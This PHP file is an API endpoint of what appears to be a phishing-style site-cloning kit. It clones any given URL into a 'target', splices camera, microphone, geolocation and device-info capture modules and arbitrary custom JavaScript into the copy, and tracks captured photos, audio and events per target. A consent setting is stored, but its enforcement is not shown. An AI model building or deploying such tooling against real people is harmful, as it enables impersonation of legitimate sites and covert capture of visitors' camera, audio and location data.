<?php
/**
 * api/targets.php — CRUD over cloned targets. Auth-required.
 *
 *   GET    api/targets.php                     → list all targets
 *   POST   api/targets.php  (action=create)    → clone a URL
 *   POST   api/targets.php  (action=rename)    → change a target's slug
 *   POST   api/targets.php  (action=update)    → rename + payloads + JS + wording
 *   POST   api/targets.php  (action=delete)    → remove a target
 */

require_once __DIR__ . '/../auth.php';
require_once __DIR__ . '/../lib/cloner.php';
require_once __DIR__ . '/../lib/store.php';

auth_boot();
header('Content-Type: application/json');

if (auth_user() === null) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'Not authenticated.']);
    exit;
}

$targets_dir   = realpath(__DIR__ . '/..') . '/targets';
$valid_modules = ['device-info', 'camera', 'microphone', 'geolocation'];

function reply(int $code, array $payload): void {
    http_response_code($code);
    echo json_encode($payload);
    exit;
}

function api_targets_read_consent(): ?array {
    if (isset($_POST['consent']) && is_array($_POST['consent'])) {
        return $_POST['consent'];
    }
    if (isset($_POST['consent_json']) && is_string($_POST['consent_json'])) {
        $decoded = json_decode($_POST['consent_json'], true);
        if (is_array($decoded)) return $decoded;
    }
    return null;
}

/* ------------------------------------------------------------------ *
 *  GET → list
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $targets = store_target_list();
    $list = [];
    foreach ($targets as $meta) {
        $slug = $meta['slug'];
        $meta['captures_count'] = store_media_count($slug, 'camera');
        $meta['audio_count']    = store_media_count($slug, 'mic');

        [$events, $last] = store_event_count($slug);
        $meta['events_count']  = $events;
        $meta['last_event_at'] = $last;
        $meta['custom_js']     = (string) ($meta['custom_js'] ?? '');

        $list[] = $meta;
    }

    reply(200, ['ok' => true, 'targets' => $list]);
}

/* ------------------------------------------------------------------ *
 *  POST → create / rename / update / delete
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    reply(405, ['ok' => false, 'error' => 'Method not allowed.']);
}

$action = $_POST['action'] ?? '';

if ($action === 'create') {
    $url = trim($_POST['url'] ?? '');

    if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) {
        reply(400, ['ok' => false, 'error' => 'Please enter a valid URL.']);
    }
    $scheme = strtolower((string) parse_url($url, PHP_URL_SCHEME));
    if ($scheme !== 'http' && $scheme !== 'https') {
        reply(400, ['ok' => false, 'error' => 'URL scheme must be http or https.']);
    }

    $raw_payloads = $_POST['payloads'] ?? [];
    if (is_string($raw_payloads)) $raw_payloads = [$raw_payloads];
    if (!is_array($raw_payloads))  $raw_payloads = [];
    $payloads = array_values(array_intersect($valid_modules, $raw_payloads));

    $custom_slug = strtolower(trim((string) ($_POST['slug'] ?? '')));
    if ($custom_slug !== '') {
        if (!cloner_valid_slug($custom_slug)) {
            reply(400, ['ok' => false, 'error' => 'Slug must be 1–32 chars, lowercase letters/digits/dashes/underscores, and not a reserved word.']);
        }
        if (is_dir("$targets_dir/$custom_slug")) {
            reply(409, ['ok' => false, 'error' => 'A target with that slug already exists.']);
        }
        $slug = $custom_slug;
    } else {
        do { $slug = cloner_new_slug(); } while (is_dir("$targets_dir/$slug"));
    }

    $target_dir = "$targets_dir/$slug";

    $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
              || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
              || (($_SERVER['REQUEST_SCHEME'] ?? '') === 'https');
    $proto          = $is_https ? 'https' : 'http';
    $host           = (string) ($_SERVER['HTTP_HOST'] ?? 'localhost');
    $public_origin  = "{$proto}://{$host}";

    $consent_in = api_targets_read_consent();
    $consent    = cloner_consent_config($consent_in ?? []);

    $result = cloner_clone($url, $target_dir, $payloads, $public_origin, $consent);
    if (!$result['ok']) {
        cloner_rrmdir($target_dir);
        reply(500, ['ok' => false, 'error' => 'Clone failed: ' . implode('; ', $result['errors'])]);
    }

    $render_mode = $result['render_mode'] ?? 'http';
    $target_host = (string) parse_url($url, PHP_URL_HOST);

    // Write to DB instead of meta.json.
    store_target_create($slug, $url, $target_host, $payloads, $consent_in ?? [], $render_mode);
    // Patch created_at since store_target_create uses time().
    // Also keep meta.json for backward compat during transition.
    $meta = [
        'slug'        => $slug,
        'url'         => $url,
        'host'        => $target_host,
        'payloads'    => $payloads,
        'consent'     => $consent_in ?? [],
        'render_mode' => $render_mode,
        'created_at'  => time(),
    ];
    file_put_contents("$target_dir/meta.json", json_encode($meta, JSON_PRETTY_PRINT), LOCK_EX);

    $meta['captures_count'] = 0;
    $meta['audio_count']    = 0;
    reply(200, ['ok' => true, 'target' => $meta, 'warnings' => $result['errors']]);
}

if ($action === 'rename') {
    $slug     = strtolower(trim((string) ($_POST['slug'] ?? '')));
    $new_slug = strtolower(trim((string) ($_POST['new_slug'] ?? '')));
    if (!cloner_valid_slug($slug)) {
        reply(400, ['ok' => false, 'error' => 'Invalid current slug.']);
    }
    if (!cloner_valid_slug($new_slug)) {
        reply(400, ['ok' => false, 'error' => 'New slug must be 1–32 chars, lowercase letters/digits/dashes/underscores, and not a reserved word.']);
    }
    $res = cloner_rename_slug($targets_dir, $slug, $new_slug);
    if (!$res['ok']) {
        $code = 400;
        if ($res['error'] === 'Target not found.')                           $code = 404;
        if ($res['error'] === 'A target with that slug already exists.')     $code = 409;
        reply($code, ['ok' => false, 'error' => $res['error']]);
    }
    // Update DB slug (cascades to events + media via foreign key).
    store_target_update($slug, ['slug' => $new_slug]);

    reply(200, ['ok' => true, 'slug' => $new_slug]);
}

if ($action === 'update') {
    $slug     = strtolower(trim((string) ($_POST['slug'] ?? '')));
    $new_slug = strtolower(trim((string) ($_POST['new_slug'] ?? $slug)));

    $has_js   = array_key_exists('custom_js', $_POST);
    $custom_js = $has_js ? (string) $_POST['custom_js'] : '';

    $consent_in  = api_targets_read_consent();
    $has_consent = $consent_in !== null;

    $has_payloads     = isset($_POST['payloads']) || isset($_POST['payloads_empty']);
    $payloads_in      = $_POST['payloads'] ?? [];
    if (is_string($payloads_in)) $payloads_in = [$payloads_in];
    if (!is_array($payloads_in)) $payloads_in = [];
    $new_payloads     = array_values(array_intersect($valid_modules, $payloads_in));

    if (!cloner_valid_slug($slug)) {
        reply(400, ['ok' => false, 'error' => 'Invalid current slug.']);
    }
    if (!cloner_valid_slug($new_slug)) {
        reply(400, ['ok' => false, 'error' => 'New slug must be 1–32 chars, lowercase letters/digits/dashes/underscores, and not a reserved word.']);
    }
    if (strlen($custom_js) > 256 * 1024) {
        reply(413, ['ok' => false, 'error' => 'Custom JS exceeds 256 KiB.']);
    }

    if ($slug !== $new_slug) {
        $rn = cloner_rename_slug($targets_dir, $slug, $new_slug);
        if (!$rn['ok']) {
            $code = 400;
            if ($rn['error'] === 'Target not found.')                       $code = 404;
            if ($rn['error'] === 'A target with that slug already exists.') $code = 409;
            reply($code, ['ok' => false, 'error' => $rn['error']]);
        }
        store_target_update($slug, ['slug' => $new_slug]);
    }

    $effective_slug = $new_slug;
    $target_dir     = "$targets_dir/$effective_slug";

    $meta = store_target_get($effective_slug);
    if ($meta === null) {
        reply(404, ['ok' => false, 'error' => 'Target not found.']);
    }

    $db_updates = [];
    if ($has_payloads) $db_updates['payloads'] = $new_payloads;
    if ($has_js)       $db_updates['custom_js'] = $custom_js;
    if ($has_consent)  $db_updates['consent']   = $consent_in;

    if (!empty($db_updates)) {
        store_target_update($effective_slug, $db_updates);
        $meta = store_target_get($effective_slug);

        // Re-splice the payload block in the cloned index.html.
        $payloads     = is_array($meta['payloads'] ?? null) ? $meta['payloads'] : [];
        $original_url = (string) ($meta['url'] ?? '');
        $effective_js = (string) ($meta['custom_js'] ?? '');
        $consent      = cloner_consent_config(is_array($meta['consent'] ?? null) ? $meta['consent'] : []);
        if (!cloner_replace_payload_block($target_dir, $payloads, $original_url, $effective_js, $consent)) {
            reply(500, ['ok' => false, 'error' => 'Failed to write index.html.']);
        }

        // Keep meta.json in sync during transition.
        file_put_contents("$target_dir/meta.json", json_encode($meta, JSON_PRETTY_PRINT), LOCK_EX);
    }

    reply(200, ['ok' => true, 'slug' => $effective_slug]);
}

if ($action === 'delete') {
    $slug = strtolower(trim((string) ($_POST['slug'] ?? '')));
    if (!cloner_valid_slug($slug)) {
        reply(400, ['ok' => false, 'error' => 'Invalid slug.']);
    }
    $dir = "$targets_dir/$slug";
    if (!is_dir($dir)) {
        reply(404, ['ok' => false, 'error' => 'Target not found.']);
    }
    // DB delete cascades events + media rows.
    store_target_delete($slug);
    if (!cloner_rrmdir($dir)) {
        reply(500, ['ok' => false, 'error' => 'Failed to delete target directory.']);
    }
    reply(200, ['ok' => true]);
}

reply(400, ['ok' => false, 'error' => 'Unknown action.']);
